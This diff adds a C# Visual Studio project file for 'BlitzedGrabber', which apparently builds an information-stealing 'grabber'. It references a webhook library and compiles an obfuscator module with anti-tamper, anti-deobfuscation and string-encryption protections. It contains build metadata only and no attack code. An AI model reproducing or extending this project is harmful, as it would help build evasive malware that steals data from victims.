@@ -1,0 +1,114 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{48289920-0C6D-4C74-99DC-CBDE83A61B1D}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>BlitzedGrabber</RootNamespace>
+    <AssemblyName>BlitzedGrabber</AssemblyName>
+    <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <ApplicationIcon>BlitzedGrabber.ico</ApplicationIcon>
+    <StartupObject>BlitzedGrabber.Program</StartupObject>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="BlitzedWebhook">
+      <HintPath>..\..\BlitzedWebhook.dll</HintPath>
+    </Reference>
+    <Reference Include="dnlib">
+      <HintPath>..\..\dnlib.dll</HintPath>
+    </Reference>
+    <Reference Include="MetroFramework">
+      <HintPath>..\..\MetroFramework.dll</HintPath>
+    </Reference>
+    <Reference Include="SharpConfigParser">
+      <HintPath>..\..\SharpConfigParser.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Configuration" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Windows.Forms" />
+  </ItemGroup>
+  <ItemGroup>
+    <AppDesigner Include="Properties\" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Base64.cs" />
+    <Compile Include="BlitzedConfuser\Kappa.cs" />
+    <Compile Include="BlitzedConfuser\Protections\AntiDe4dot.cs" />
+    <Compile Include="BlitzedConfuser\Protections\AntiTamper.cs" />
+    <Compile Include="BlitzedConfuser\Protections\ControlFlow.cs" />
+    <Compile Include="BlitzedConfuser\Protections\IntEncoding.cs" />
+    <Compile Include="BlitzedConfuser\Protections\InvalidMetadata.cs" />
+    <Compile Include="BlitzedConfuser\Protections\JunkDefs.cs" />
+    <Compile Include="BlitzedConfuser\Protections\Protection.cs" />
+    <Compile Include="BlitzedConfuser\Protections\ProxyAdder.cs" />
+    <Compile Include="BlitzedConfuser\Protections\Renamer.cs" />
+    <Compile Include="BlitzedConfuser\Protections\StringEncryption.cs" />
+    <Compile Include="BlitzedConfuser\Protections\StripDOSHeader.cs" />
+    <Compile Include="BlitzedConfuser\Utils\Analyzer\DefAnalyzer.cs" />
+    <Compile Include="BlitzedConfuser\Utils\Analyzer\EventDefAnalyzer.cs" />
+    <Compile Include="BlitzedConfuser\Utils\Analyzer\FieldDefAnalyzer.cs" />
+    <Compile Include="BlitzedConfuser\Utils\Analyzer\MethodDefAnalyzer.cs" />
+    <Compile Include="BlitzedConfuser\Utils\Analyzer\ParameterAnalyzer.cs" />
+    <Compile Include="BlitzedConfuser\Utils\Analyzer\PropertyDefAnalyzer.cs" />
+    <Compile Include="BlitzedConfuser\Utils\Analyzer\TypeDefAnalyzer.cs" />
+    <Compile Include="BlitzedConfuser\Utils\InjectContext.cs" />
+    <Compile Include="BlitzedConfuser\Utils\InjectHelper.cs" />
+    <Compile Include="BlitzedConfuser\Utils\MemberRenamer.cs" />
+    <Compile Include="BlitzedConfuser\Utils\ProxyExtension.cs" />
+    <Compile Include="BlitzedConfuser\Utils\Randomizer.cs" />
+    <Compile Include="BlitzedConfuser\Utils\Reference.cs" />
+    <Compile Include="BlitzedConfuser\Utils\StringDecoder.cs" />
+    <Compile Include="BlitzedConfuser\Utils\TamperClass.cs" />
+    <Compile Include="BlitzedConfuser\Utils\Watermark.cs" />
+    <Compile Include="Form1.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Form1.Designer.cs">
+      <DependentUpon>Form1.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Properties\Resources.cs" />
+    <Compile Include="Properties\Settings.Designer.cs">
+      <DependentUpon>Settings.settings</DependentUpon>
+      <AutoGen>True</AutoGen>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="Form1.resources" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.manifest" />
+    <None Include="Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
